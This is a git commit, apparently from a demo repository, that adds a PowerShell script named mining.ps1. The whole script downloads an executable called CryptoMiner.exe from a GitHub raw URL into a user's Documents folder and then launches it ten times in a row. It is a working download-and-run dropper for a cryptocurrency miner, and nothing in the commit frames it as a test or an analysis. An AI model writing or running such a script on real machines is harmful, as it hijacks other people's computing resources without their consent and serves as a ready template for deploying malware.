1ff500965a9a9d2d8fc9646e5fd73521bda82bfa
tmmdemo <37916298+tmmdemo@users.noreply.github.com>
2018-09-20 15:55:54 -0500

    Add files via upload

---
+++ mining.ps1
@@ -0,0 +1,15 @@
+﻿$URL = "https://raw.githubusercontent.com/tmmdemo/automate/master/CryptoMiner.exe"
+$DEST = "c:\Users\Admin\My Documents\CryptoMiner.exe"
+$web = New-Object -TypeName System.Net.WebClient
+$web.DownloadFile($URL,$DEST)
+$exe = "c:\Users\Admin\My Documents\CryptoMiner.exe"
+& $exe
+& $exe
+& $exe
+& $exe
+& $exe
+& $exe
+& $exe
+& $exe
+& $exe
+& $exe
